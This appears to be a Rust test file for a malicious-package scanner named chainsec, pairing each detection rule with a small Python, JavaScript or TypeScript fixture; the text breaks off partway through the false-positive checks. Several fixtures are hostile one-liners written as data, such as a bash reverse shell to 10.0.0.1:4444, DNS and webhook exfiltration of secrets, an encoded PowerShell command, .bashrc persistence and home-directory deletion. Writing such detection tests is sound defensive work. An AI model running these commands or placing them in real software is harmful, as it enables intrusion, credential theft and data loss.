//! One positive test case per built-in rule. Each case writes a minimal source
//! snippet to a temporary directory, scans it with only that rule enabled, and
//! asserts that the rule produces at least one finding.

use std::fs;

use chainsec::{
    model::{EngineLimits, Language, Risk, Rule},
    rules, scanner,
};

struct Case {
    rule_id: &'static str,
    file: &'static str,
    source: &'static str,
}

const CASES: &[Case] = &[
    // Built-in Python rules.
    Case {
        rule_id: "chainsec.py.detection.dynamic-import",
        file: "case.py",
        source: "import importlib\nmodule = importlib.import_module(module_name)\n",
    },
    Case {
        rule_id: "chainsec.py.detection.dynamic-code-execution",
        file: "case.py",
        source: "eval(user_input)\n",
    },
    Case {
        rule_id: "chainsec.py.detection.decoded-payload",
        file: "case.py",
        source: "import base64\nbase64.b64decode('QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB')\n",
    },
    Case {
        rule_id: "chainsec.py.detection.process-spawn",
        file: "case.py",
        source: "import os\nos.system(\"ls\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.network-request",
        file: "case.py",
        source: "import requests\nrequests.get(\"https://example.com\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.filesystem-open",
        file: "case.py",
        source: "open(\"/etc/passwd\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.unsafe-deserialization",
        file: "case.py",
        source: "import pickle\npickle.loads(blob)\n",
    },
    // Built-in JavaScript rules.
    Case {
        rule_id: "chainsec.js.detection.dynamic-code-execution",
        file: "case.js",
        source: "eval(input);\n",
    },
    Case {
        rule_id: "chainsec.js.detection.decoded-payload",
        file: "case.js",
        source: "atob('QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB');\n",
    },
    Case {
        rule_id: "chainsec.js.detection.process-spawn",
        file: "case.js",
        source: "exec(\"ls\");\n",
    },
    Case {
        rule_id: "chainsec.js.detection.network-request",
        file: "case.js",
        source: "Deno.listen({ port: 8080 });\n",
    },
    Case {
        rule_id: "chainsec.js.detection.read-environment",
        file: "case.js",
        source: "console.log(process.env.API_TOKEN);\n",
    },
    Case {
        rule_id: "chainsec.js.detection.dynamic-require",
        file: "case.js",
        source: "require(moduleName);\n",
    },
    // Built-in TypeScript rules.
    Case {
        rule_id: "chainsec.ts.detection.dynamic-code-execution",
        file: "case.ts",
        source: "eval(input);\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.decoded-payload",
        file: "case.ts",
        source: "atob('QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB');\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.process-spawn",
        file: "case.ts",
        source: "new Deno.Command(\"ls\").output();\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.network-request",
        file: "case.ts",
        source: "Deno.serveHttp(connection);\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.read-environment",
        file: "case.ts",
        source: "Deno.env.get(\"API_TOKEN\");\n",
    },
    // Built-in obfuscation heuristics.
    Case {
        rule_id: "chainsec.py.detection.character-assembly",
        file: "case.py",
        source: "decoded = \"\".join([chr(ord(a)), chr(ord(b)), chr(ord(c)), chr(ord(d)), chr(ord(e)), chr(ord(f)), chr(ord(g)), chr(ord(h))])\n",
    },
    Case {
        rule_id: "chainsec.py.detection.encoded-escapes",
        file: "case.py",
        source: "payload = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\njoined = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\" + \"\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\n",
    },
    Case {
        rule_id: "chainsec.py.detection.ambiguous-identifier",
        file: "case.py",
        source: "_0x1d8f = payload\n",
    },
    Case {
        rule_id: "chainsec.py.detection.reflective-namespace",
        file: "case.py",
        source: "loader = handler.__globals__[\"__builtins__\"][\"__import__\"]\nnamespace = getattr(handler, \"__globals__\")\nsetattr(handler, \"__loader__\", loader)\n",
    },
    Case {
        rule_id: "chainsec.js.detection.character-code-assembly",
        file: "case.js",
        source: "const decoded = [65, 66, 67, 68, 69, 70, 71, 72].map((code) => String.fromCharCode(code)).join(\"\");\n",
    },
    Case {
        rule_id: "chainsec.js.detection.encoded-escapes",
        file: "case.js",
        source: "const payload = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\";\nconst joined = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\" + \"\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\";\n",
    },
    Case {
        rule_id: "chainsec.js.detection.ambiguous-identifier",
        file: "case.js",
        source: "const OO0O0O = payload;\n",
    },
    Case {
        rule_id: "chainsec.js.detection.write-browser-global",
        file: "case.js",
        source: "window[\"sessionKey\"] = token;\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.character-code-assembly",
        file: "case.ts",
        source: "const decoded = [65, 66, 67, 68, 69, 70, 71, 72].map((code) => String.fromCharCode(code)).join(\"\");\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.encoded-escapes",
        file: "case.ts",
        source: "const payload = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\";\nconst joined = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\" + \"\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\";\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.ambiguous-identifier",
        file: "case.ts",
        source: "const OO0O0O = payload;\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.write-browser-global",
        file: "case.ts",
        source: "window.sessionKey = token;\n",
    },
    // High-entropy string rules.
    Case {
        rule_id: "chainsec.py.detection.heuristic.high-entropy-string",
        file: "case.py",
        source: "token = \"aZ8xK2vQ9wN4rT7yU1iO5pL3sD6fG0hJ9kM2nB8vC4xZ\"\n",
    },
    Case {
        rule_id: "chainsec.js.detection.heuristic.high-entropy-string",
        file: "case.js",
        source: "const token = \"aZ8xK2vQ9wN4rT7yU1iO5pL3sD6fG0hJ9kM2nB8vC4xZ\";\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.heuristic.high-entropy-string",
        file: "case.ts",
        source: "const token = \"aZ8xK2vQ9wN4rT7yU1iO5pL3sD6fG0hJ9kM2nB8vC4xZ\";\n",
    },
    // Semantic obfuscation and dynamic-execution rules.
    Case {
        rule_id: "chainsec.js.detection.heuristic.computed-global-execution",
        file: "case.js",
        source: "globalThis['eval'](payload);\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.heuristic.computed-global-execution",
        file: "case.ts",
        source: "window['Function'](payload);\n",
    },
    Case {
        rule_id: "chainsec.js.detection.heuristic.string-timer-execution",
        file: "case.js",
        source: "setTimeout('payload()', 0);\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.heuristic.string-timer-execution",
        file: "case.ts",
        source: "setInterval('payload()', 0);\n",
    },
    Case {
        rule_id: "chainsec.js.detection.heuristic.vm-context-execution",
        file: "case.js",
        source: "vm.runInThisContext(payload);\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.heuristic.vm-context-execution",
        file: "case.ts",
        source: "vm.runInNewContext(payload);\n",
    },
    Case {
        rule_id: "chainsec.js.detection.heuristic.worker-blob-execution",
        file: "case.js",
        source: "new Worker(URL.createObjectURL(payload));\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.heuristic.worker-blob-execution",
        file: "case.ts",
        source: "new Worker(blob);\n",
    },
    Case {
        rule_id: "chainsec.js.detection.heuristic.string-table",
        file: "case.js",
        source: "const _0x1234 = ['a','b','c','d','e'];\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.heuristic.string-table",
        file: "case.ts",
        source: "const _0x1234 = ['a','b','c','d','e'];\n",
    },
    Case {
        rule_id: "chainsec.js.detection.javascript-obfuscator",
        file: "case.js",
        source: "function _0x4a7b(){const _0x2f1c=['alpha','bravo','charlie','delta'];_0x4a7b=function(){return _0x2f1c;};return _0x4a7b();}\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.javascript-obfuscator",
        file: "case.ts",
        source: "function _0x4a7b(){const _0x2f1c=['alpha','bravo','charlie','delta'];_0x4a7b=function(){return _0x2f1c;};return _0x4a7b();}\n",
    },
    Case {
        rule_id: "chainsec.js.detection.javascript-obfuscator-vm-identifier",
        file: "case.js",
        source: "const vmz_8b26be = 1;\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.javascript-obfuscator-vm-identifier",
        file: "case.ts",
        source: "const vme_60ad03 = 1;\n",
    },
    Case {
        rule_id: "chainsec.js.detection.heuristic.control-flow-flattening",
        file: "case.js",
        source: "while (cursor < order.length) { switch (order[cursor++]) { case '0': run(); break; case '1': stop(); break; } }\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.heuristic.control-flow-flattening",
        file: "case.ts",
        source: "while (cursor < order.length) { switch (order[cursor++]) { case '0': run(); break; case '1': stop(); break; } }\n",
    },
    Case {
        rule_id: "chainsec.js.detection.heuristic.rc4-decoder",
        file: "case.js",
        source: "const state = Array(256); const key = input.charCodeAt(0); const result = String.fromCharCode(key ^ (state[0] % 256));\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.heuristic.rc4-decoder",
        file: "case.ts",
        source: "const state = Array(256); const key = input.charCodeAt(0); const result = String.fromCharCode(key ^ (state[0] % 256));\n",
    },
    Case {
        rule_id: "chainsec.js.detection.heuristic.embedded-vm",
        file: "case.js",
        source: "const bytecode = new Uint8Array(data); let opcode = bytecode[0]; while (opcode) { switch (opcode) { case 1: dispatch(); } }\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.heuristic.embedded-vm",
        file: "case.ts",
        source: "const bytecode = new Uint8Array(data); let opcode = bytecode[0]; while (opcode) { switch (opcode) { case 1: dispatch(); } }\n",
    },
    Case {
        rule_id: "chainsec.py.detection.heuristic.opaque-execution-input",
        file: "case.py",
        source: "import marshal\nexec(marshal.loads(blob))\n",
    },
    Case {
        rule_id: "chainsec.py.detection.heuristic.dynamic-module",
        file: "case.py",
        source: "import importlib\nmodule = importlib.import_module(name)\n",
    },
    Case {
        rule_id: "chainsec.py.detection.heuristic.code-protector-marker",
        file: "case.py",
        source: "from pyarmor_runtime import __pyarmor__\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.dynamic-require",
        file: "case.ts",
        source: "require(moduleName);\n",
    },
    // GuardDog capability rules (Python).
    Case {
        rule_id: "chainsec.py.capability.secret-read-browser-profile",
        file: "case.py",
        source: "path = \"~/Library/Safari/LocalStorage\"\n",
    },
    Case {
        rule_id: "chainsec.py.capability.filesystem-delete",
        file: "case.py",
        source: "import shutil\nshutil.rmtree(\"/tmp/stale\")\n",
    },
    Case {
        rule_id: "chainsec.py.capability.filesystem-read",
        file: "case.py",
        source: "from pathlib import Path\nPath(\"data.txt\").read_text()\n",
    },
    Case {
        rule_id: "chainsec.py.capability.filesystem-set-permissions",
        file: "case.py",
        source: "import os\nos.chmod(\"tool.sh\", 0o755)\n",
    },
    Case {
        rule_id: "chainsec.py.capability.filesystem-write",
        file: "case.py",
        source: "open(\"data.txt\", \"w\")\n",
    },
    Case {
        rule_id: "chainsec.py.capability.network-listen",
        file: "case.py",
        source: "server.listen()\n",
    },
    Case {
        rule_id: "chainsec.py.capability.network-raw-socket",
        file: "case.py",
        source: "import socket\nsocket.socket(socket.AF_INET, socket.SOCK_RAW)\n",
    },
    Case {
        rule_id: "chainsec.py.capability.network-download",
        file: "case.py",
        source: "import wget\nwget.download(\"https://example.com/f.bin\")\n",
    },
    Case {
        rule_id: "chainsec.py.capability.network-connect",
        file: "case.py",
        source: "import socket\nsock = socket.socket()\nsock.connect((\"example.com\", 443))\n",
    },
    Case {
        rule_id: "chainsec.py.capability.network-tls",
        file: "case.py",
        source: "import ssl\nssl_context = ssl.create_default_context()\nssl_context.wrap_socket(sock, server_hostname=\"example.com\")\n",
    },
    Case {
        rule_id: "chainsec.py.capability.network-connect-via-lolbas",
        file: "case.py",
        source: "import os\nos.system(\"curl https://example.com/payload\")\n",
    },
    Case {
        rule_id: "chainsec.py.capability.process-schedule",
        file: "case.py",
        source: "from crontab import CronTab\nCronTab(user=\"root\")\n",
    },
    Case {
        rule_id: "chainsec.py.capability.process-spawn",
        file: "case.py",
        source: "import os\nos.spawnl(os.P_NOWAIT, \"/bin/ls\")\n",
    },
    Case {
        rule_id: "chainsec.py.capability.dynamic-code-execution",
        file: "case.py",
        source: "eval(payload)\n",
    },
    Case {
        rule_id: "chainsec.py.capability.clipboard-access",
        file: "case.py",
        source: "import pyperclip\npyperclip.paste()\n",
    },
    // GuardDog capability rules (JavaScript/TypeScript share queries).
    Case {
        rule_id: "chainsec.js.capability.secret-read-browser-profile",
        file: "case.js",
        source: "const store = \"chrome-cookies-secure\";\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.secret-read-browser-profile",
        file: "case.ts",
        source: "const store = \"chrome-cookies-secure\";\n",
    },
    Case {
        rule_id: "chainsec.js.capability.filesystem-delete",
        file: "case.js",
        source: "fs.rmSync(\"/tmp/stale\", { recursive: true });\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.filesystem-delete",
        file: "case.ts",
        source: "Deno.remove(\"/tmp/stale\", { recursive: true });\n",
    },
    Case {
        rule_id: "chainsec.js.capability.filesystem-read",
        file: "case.js",
        source: "fs.readFileSync(\"data.txt\");\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.filesystem-read",
        file: "case.ts",
        source: "Deno.readTextFile(\"data.txt\");\n",
    },
    Case {
        rule_id: "chainsec.js.capability.filesystem-set-permissions",
        file: "case.js",
        source: "fs.chmodSync(\"tool.sh\", 0o755);\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.filesystem-set-permissions",
        file: "case.ts",
        source: "Deno.chmod(\"tool.sh\", 0o755);\n",
    },
    Case {
        rule_id: "chainsec.js.capability.filesystem-write",
        file: "case.js",
        source: "fs.writeFileSync(\"data.txt\", \"content\");\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.filesystem-write",
        file: "case.ts",
        source: "Deno.writeTextFile(\"data.txt\", \"content\");\n",
    },
    Case {
        rule_id: "chainsec.js.capability.network-listen",
        file: "case.js",
        source: "http.createServer(handler);\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.network-listen",
        file: "case.ts",
        source: "http.createServer(handler);\n",
    },
    Case {
        rule_id: "chainsec.js.capability.network-raw-socket",
        file: "case.js",
        source: "require(\"raw-socket\");\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.network-raw-socket",
        file: "case.ts",
        source: "import raw from \"raw-socket\";\n",
    },
    Case {
        rule_id: "chainsec.js.capability.network-download",
        file: "case.js",
        source: "got(\"https://example.com/f.bin\");\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.network-download",
        file: "case.ts",
        source: "got(\"https://example.com/f.bin\");\n",
    },
    Case {
        rule_id: "chainsec.js.capability.network-connect",
        file: "case.js",
        source: "dns.lookup(\"example.com\");\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.network-connect",
        file: "case.ts",
        source: "Deno.connect({ hostname: \"example.com\", port: 443 });\n",
    },
    Case {
        rule_id: "chainsec.js.capability.network-tls",
        file: "case.js",
        source: "tls.connect(443, \"example.com\");\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.network-tls",
        file: "case.ts",
        source: "Deno.connectTls({ hostname: \"example.com\", port: 443 });\n",
    },
    Case {
        rule_id: "chainsec.js.capability.network-connect-via-lolbas",
        file: "case.js",
        source: "exec(\"curl https://example.com/payload\");\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.network-connect-via-lolbas",
        file: "case.ts",
        source: "exec(\"curl https://example.com/payload\");\n",
    },
    Case {
        rule_id: "chainsec.js.capability.process-schedule",
        file: "case.js",
        source: "const cron = require(\"node-cron\");\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.process-schedule",
        file: "case.ts",
        source: "import cron from \"node-cron\";\n",
    },
    Case {
        rule_id: "chainsec.js.capability.process-spawn",
        file: "case.js",
        source: "child_process.execSync(\"ls\");\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.process-spawn",
        file: "case.ts",
        source: "new Deno.Command(\"ls\").output();\n",
    },
    Case {
        rule_id: "chainsec.js.capability.dynamic-code-execution",
        file: "case.js",
        source: "eval(payload);\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.dynamic-code-execution",
        file: "case.ts",
        source: "eval(payload);\n",
    },
    Case {
        rule_id: "chainsec.js.capability.clipboard-access",
        file: "case.js",
        source: "clipboardy.readSync();\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.clipboard-access",
        file: "case.ts",
        source: "clipboardy.readSync();\n",
    },
    // Additional capability rules.
    Case {
        rule_id: "chainsec.py.capability.secret-read-environment",
        file: "case.py",
        source: "os.getenv(\"TOKEN\")\n",
    },
    Case {
        rule_id: "chainsec.js.capability.secret-read-environment",
        file: "case.js",
        source: "process.env.TOKEN;\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.secret-read-environment",
        file: "case.ts",
        source: "Deno.env.get(\"TOKEN\");\n",
    },
    Case {
        rule_id: "chainsec.py.capability.secret-read-file",
        file: "case.py",
        source: "path = \"~/.aws/credentials\"\n",
    },
    Case {
        rule_id: "chainsec.js.capability.secret-read-file",
        file: "case.js",
        source: "const path = \"~/.aws/credentials\";\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.secret-read-file",
        file: "case.ts",
        source: "const path = \"~/.aws/credentials\";\n",
    },
    Case {
        rule_id: "chainsec.py.capability.filesystem-enumerate",
        file: "case.py",
        source: "os.listdir(\".\")\n",
    },
    Case {
        rule_id: "chainsec.js.capability.filesystem-enumerate",
        file: "case.js",
        source: "fs.readdirSync(\".\");\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.filesystem-enumerate",
        file: "case.ts",
        source: "fs.readdirSync(\".\");\n",
    },
    Case {
        rule_id: "chainsec.py.capability.filesystem-archive",
        file: "case.py",
        source: "archive.extractall(path)\n",
    },
    Case {
        rule_id: "chainsec.js.capability.filesystem-archive",
        file: "case.js",
        source: "archive.extractAll(path);\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.filesystem-archive",
        file: "case.ts",
        source: "archive.extractAll(path);\n",
    },
    Case {
        rule_id: "chainsec.py.capability.network-resolve-dns",
        file: "case.py",
        source: "socket.gethostbyname(\"example.com\")\n",
    },
    Case {
        rule_id: "chainsec.js.capability.network-resolve-dns",
        file: "case.js",
        source: "dns.lookup(\"example.com\");\n",
    },
    Case {
        rule_id: "chainsec.ts.capability.network-resolve-dns",
        file: "case.ts",
        source: "dns.lookup(\"example.com\");\n",
    },
    // GuardDog threat rules (Python).
    Case {
        rule_id: "chainsec.py.detection.guarddog.autostart",
        file: "case.py",
        source: "open(\"/home/user/.bashrc\", \"a\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.destructive-deletion",
        file: "case.py",
        source: "import shutil\nshutil.rmtree(\"/home/user\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.dns-exfiltration",
        file: "case.py",
        source: "import socket\nsocket.gethostbyname(secret + \".example.com\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.messenger-exfiltration",
        file: "case.py",
        source: "url = \"https://api.telegram.org/bot123456:AAH8fK2vQ9wN4rT7yU1iO5pL3sD6fG0hJ9k/sendMessage\"\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.suspicious-network-destination",
        file: "case.py",
        source: "callback = \"https://webhook.site/abc-def\"\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.reverse-shell",
        file: "case.py",
        source: "import os\nos.system(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.cryptomining",
        file: "case.py",
        source: "miner = \"xmrig\"\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.download-and-execute",
        file: "case.py",
        source: "import os\nos.system(\"pip install evil-package\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.encoded-powershell",
        file: "case.py",
        source: "import os\nos.system(\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.base64-decoded-execution",
        file: "case.py",
        source: "import base64\nexec(base64.b64decode(blob))\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.dynamic-import",
        file: "case.py",
        source: "exec(__import__(\"os\"))\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.reflective-api",
        file: "case.py",
        source: "getattr(mod, \"exec\")(\"code\")\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.pyarmor",
        file: "case.py",
        source: "__pyarmor__(__name__, __file__, b'payload')\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.screen-capture",
        file: "case.py",
        source: "import pyautogui\npyautogui.screenshot()\n",
    },
    Case {
        rule_id: "chainsec.py.detection.guarddog.credential-environment",
        file: "case.py",
        source: "import os\nos.getenv(\"AWS_SECRET_ACCESS_KEY\")\n",
    },
    // GuardDog threat rules (JavaScript/TypeScript share queries).
    Case {
        rule_id: "chainsec.js.detection.guarddog.autostart",
        file: "case.js",
        source: "fs.appendFileSync(\"/home/user/.bashrc\", \"payload\");\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.autostart",
        file: "case.ts",
        source: "fs.appendFileSync(\"/home/user/.bashrc\", \"payload\");\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.destructive-deletion",
        file: "case.js",
        source: "rimraf(\"/home/user\");\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.destructive-deletion",
        file: "case.ts",
        source: "rimraf(\"/home/user\");\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.messenger-exfiltration",
        file: "case.js",
        source: "const url = \"https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz\";\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.messenger-exfiltration",
        file: "case.ts",
        source: "const url = \"https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz\";\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.suspicious-network-destination",
        file: "case.js",
        source: "const callback = \"https://ngrok.io/tunnel\";\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.suspicious-network-destination",
        file: "case.ts",
        source: "const callback = \"https://ngrok.io/tunnel\";\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.reverse-shell",
        file: "case.js",
        source: "exec(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\");\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.reverse-shell",
        file: "case.ts",
        source: "exec(\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\");\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.cryptomining",
        file: "case.js",
        source: "const miner = \"xmrig\";\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.cryptomining",
        file: "case.ts",
        source: "const miner = \"xmrig\";\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.download-and-execute",
        file: "case.js",
        source: "exec(\"npm install evil-package\");\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.download-and-execute",
        file: "case.ts",
        source: "exec(\"npm install evil-package\");\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.encoded-powershell",
        file: "case.js",
        source: "exec(\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\");\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.encoded-powershell",
        file: "case.ts",
        source: "exec(\"powershell -EncodedCommand SQBFAFgAIAAoACcAAG4AZQB3AC0A\");\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.base64-decoded-execution",
        file: "case.js",
        source: "eval(atob(payload));\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.base64-decoded-execution",
        file: "case.ts",
        source: "eval(atob(payload));\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.reflective-api",
        file: "case.js",
        source: "Object.getOwnPropertyDescriptor(mod, \"run\").value();\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.reflective-api",
        file: "case.ts",
        source: "Object.getOwnPropertyDescriptor(mod, \"run\").value();\n",
    },
    Case {
        rule_id: "chainsec.js.detection.guarddog.hidden-require",
        file: "case.js",
        source: "global[\"rq\"] = require;\n",
    },
    Case {
        rule_id: "chainsec.ts.detection.guarddog.hidden-require",
        file: "case.ts",
        source: "global[\"rq\"] = require;\n",
    },
];

#[test]
fn every_built_in_rule_has_a_test_case() {
    let all_rules = rules::default_rules();
    let rule_ids: std::collections::HashSet<&str> =
        all_rules.iter().map(|rule| rule.id.as_str()).collect();
    let case_ids: std::collections::HashSet<&str> = CASES.iter().map(|case| case.rule_id).collect();

    assert_eq!(
        case_ids.len(),
        CASES.len(),
        "duplicate rule ids in CASES table"
    );
    let missing: Vec<&&str> = rule_ids.difference(&case_ids).collect();
    assert!(missing.is_empty(), "rules without test cases: {missing:?}");
    let unknown: Vec<&&str> = case_ids.difference(&rule_ids).collect();
    assert!(
        unknown.is_empty(),
        "test cases for unknown rules: {unknown:?}"
    );
}

#[test]
fn unverifiable_dynamic_imports_are_high_risk() {
    let all_rules = rules::default_rules();
    for rule_id in [
        "chainsec.py.detection.dynamic-import",
        "chainsec.js.detection.dynamic-require",
        "chainsec.ts.detection.dynamic-require",
    ] {
        let rule = all_rules
            .iter()
            .find(|rule| rule.id == rule_id)
            .unwrap_or_else(|| panic!("unknown rule {rule_id}"));
        assert_eq!(rule.risk, Risk::High, "{rule_id} must be high risk");
    }
}

#[test]
fn every_language_rule_id_starts_with_its_language() {
    for rule in rules::default_rules() {
        let prefix = match rule.language {
            Language::Python => "chainsec.py.",
            Language::JavaScript => "chainsec.js.",
            Language::TypeScript => "chainsec.ts.",
        };
        assert!(
            rule.id.starts_with(prefix),
            "rule {} must start with {prefix}",
            rule.id
        );
    }
}

#[test]
fn every_rule_matches_its_fixture() {
    let all_rules = rules::default_rules();
    for case in CASES {
        let rule: &Rule = all_rules
            .iter()
            .find(|rule| rule.id == case.rule_id)
            .unwrap_or_else(|| panic!("unknown rule {}", case.rule_id));
        assert_language_extension(rule, case);

        let directory = tempfile::tempdir().unwrap();
        let file = directory.path().join(case.file);
        fs::write(&file, case.source).unwrap();

        let outcome = scanner::scan(
            directory.path(),
            "fixture",
            std::slice::from_ref(rule),
            &EngineLimits::default(),
        )
        .unwrap_or_else(|error| panic!("scan failed for {}: {error}", case.rule_id));

        assert!(
            outcome
                .findings
                .iter()
                .any(|finding| finding.rule_id == case.rule_id),
            "rule {} did not match its fixture:\n{}",
            case.rule_id,
            case.source
        );
    }
}

fn assert_language_extension(rule: &Rule, case: &Case) {
    let expected = match rule.language {
        Language::Python => "case.py",
        Language::JavaScript => "case.js",
        Language::TypeScript => "case.ts",
    };
    assert_eq!(
        case.file, expected,
        "rule {} fixture {} does not match its language {:?}",
        rule.id, case.file, rule.language
    );
}

#[test]
fn benchmark_false_positive_shapes_do_not_match() {
    assert_no_match(
        "chainsec.js.capability.secret-read-file",
        "case.js",
        "const options = { env: 'env', proxyEnv: 'proxyEnv', package: 'proxy-from-env' };\n",
    );
    assert_no_match(
        "chainsec.ts.capability.secret-read-file",
        "case.ts",
        "const options = { env: 'env', proxyEnv: 'proxyEnv', package: 'proxy-from-env' };\n",
    );
    assert_no_match(
        "chainsec.py.capability.secret-read-file",
        "case.py",
        "options = {'env': 'env', 'proxy_env': 'proxyEnv', 'package': 'proxy-from-env'}\n",
    );
    assert_no_match(
        "chainsec.js.detection.character-code-assembly",
        "case.js",
        "const expanded = [...color].map(character => character + character).join('');\n",
    );
    assert_no_match(
        "chainsec.ts.detection.character-code-assembly",
        "case.ts",
        "const expanded = [...color].map(character => character + character).join('');\n",
    );
    assert_no_match(
        "chainsec.py.detection.dynamic-import",
        "case.py",
        "import importlib\nimportlib.import_module(\"pathlib\")\n__import__('json')\n",
    );
    assert_no_match(
        "chainsec.js.detection.dynamic-require",
        "case.js",
        "require(42);\n",
    );
    assert_no_match(
        "chainsec.ts.detection.dynamic-require",
        "case.ts",
        "require(42);\n",
    );
    assert_no_match(
        "chainsec.ts.detection.write-browser-global",
        "case.ts",
        "state.lastKey = key;\n",
    );
    assert_no_match(
        "chainsec.js.detection.heuristic.string-timer-execution",
        "case.js",
        "setTimeout(setStatus, 1, \"\");\n",
    );
    assert_no_match(
        "chainsec.ts.detection.heuristic.string-timer-execution",
        "case.ts",
        "setInterval(setStatus, 1, \"\");\n",
    );
    assert_no_match(
        "chainsec.js.detection.heuristic.string-table",
        "case.js",
        "const values = ['one', 'two', 'three', 'four', 'five'];\n",
    );
    assert_no_match(
        "chainsec.ts.detection.heuristic.string-table",
        "case.ts",
        "const values = ['one', 'two', 'three', 'four', 'five'];\n",
    );
    assert_no_match(
        "chainsec.js.detection.heuristic.string-table",
        "case.js",
        "let usedModels; usedModels = ['rgb', 'hex', 'ansi256'];\n",
    );
    assert_no_match(
        "chainsec.js.detection.heuristic.string-table",
        "case.js",
        "const colorNames = [...foregroundColorNames, ...backgroundColorNames];\n",
    );
    assert_no_match(
        "chainsec.ts.detection.heuristic.string-table",
